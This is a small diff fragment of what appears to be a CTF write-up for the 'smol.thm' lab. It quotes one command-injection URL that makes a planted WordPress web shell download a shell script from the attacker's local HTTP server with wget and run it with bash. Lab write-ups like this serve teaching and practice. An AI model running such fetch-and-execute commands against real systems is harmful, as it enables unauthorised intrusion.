@@ -406,5 +406,7 @@ define( 'DB_COLLATE', '' );
 > 
 > python3 -m http.server 8000 was used to send the file locally from my PC to smol.thm via the custom url: http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://192.168.148.210:8000/webshell.sh%20-O%20/tmp/w.sh%3Bbash%20/tmp/w.sh
 
+```
 
+```
 
